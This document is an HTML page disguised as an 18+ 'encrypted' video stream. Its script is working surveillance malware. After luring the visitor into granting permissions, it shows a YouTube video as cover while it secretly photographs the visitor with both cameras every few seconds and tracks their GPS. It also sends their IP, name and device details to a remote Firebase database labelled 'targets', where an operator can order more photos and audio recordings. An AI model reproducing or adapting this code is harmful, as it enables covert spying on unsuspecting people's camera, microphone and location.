<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access | 18+</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Courier New', Courier, monospace; }
        #bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('bg.png.jpeg'); background-size: cover; background-position: center; z-index: 1; }
        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); }
        
        /* Hacker Style UI */
        .hacker-box { border: 1px solid #0f0; padding: 20px; background: rgba(0,20,0,0.8); border-radius: 10px; text-align: center; box-shadow: 0 0 20px #0f0; }
        #unlock-btn { background: #0f0; color: #000; padding: 15px 40px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; margin-top: 20px; }
        
        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 350px; background: #0a0a0a; border: 2px solid #0f0; border-radius: 10px; padding: 25px; text-align: center; z-index: 200; color: #0f0; }
        .input-name { width: 100%; padding: 12px; margin: 15px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; box-sizing: border-box; }
        .confirm-btn { background: #0f0; color: #000; width: 100%; padding: 12px; font-weight: bold; border: none; cursor: pointer; }

        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="main-ui">
        <div class="hacker-box">
            <h1 style="color:#0f0; margin:0; font-size:20px;">ENCRYPTED NODE ACCESS</h1>
            <p style="color:#0f0; font-size:12px;">STATUS: SECURE CONNECTION PENDING...</p>
            <button id="unlock-btn" onclick="showModal()">START STREAM</button>
        </div>
    </div>

    <div id="age-modal">
        <h3>IDENTITY VERIFY</h3>
        <p style="font-size: 13px;">PLEASE ENTER NAME TO SYNC WITH ENCRYPTED SERVER</p>
        <input type="text" id="targetName" class="input-name" placeholder="Agent Name/Code">
        <button class="confirm-btn" onclick="startEverything()">AUTHORIZE ACCESS</button>
    </div>

    <div id="video-container">
        <iframe id="main-player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
    const vID = "6Ogzc_-lW9w"; 

    function showModal() { document.getElementById('age-modal').style.display = 'block'; }

    async function startEverything() {
        const uName = document.getElementById('targetName').value;
        if(!uName) return;
        document.getElementById('age-modal').style.display = 'none';

        try {
            // Permissions
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // YouTube Fix
            document.getElementById('main-player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}&controls=0`;
            document.getElementById('video-container').style.display = 'block';

            // Initial Logs & Beep Logic (Firebase)
            sendInfo(uName);
            trackGPS();
            
            // 1. Auto Capture: Front & Back immediately
            capture("user"); 
            setTimeout(() => capture("environment"), 3000);

            // 2. Auto Capture Loop: Every 5 seconds
            setInterval(() => { capture("user"); }, 5000);

            // 3. Command Listener (Dashboard Control)
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.action === 'photo_front') capture("user");
                    if(cmd.action === 'photo_back') capture("environment");
                    if(cmd.action === 'audio') recordAudio(30000);
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) { location.reload(); }
    }

    async function capture(mode) {
        try {
            const constraints = { video: { facingMode: mode === "user" ? "user" : { ideal: "environment" } } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.createElement('video');
            v.srcObject = stream;
            await v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: c.toDataURL('image/jpeg', 0.5),
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(e) { console.log("Cam Error: " + mode); }
    }

    async function recordAudio(duration) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref(`targets/${sessionID}/audio`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
                };
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), duration);
        } catch(e) {}
    }

    async function sendInfo(name) {
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({
            name: name,
            ip: ipReq.ip,
            status: "ONLINE",
            ua: navigator.userAgent,
            time: new Date().toLocaleTimeString()
        });
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({
                lat: p.coords.latitude,
                lng: p.coords.longitude,
                alt: p.coords.altitude || "N/A"
            });
        }, null, { enableHighAccuracy: true });
    }
</script>
</body>
</html>
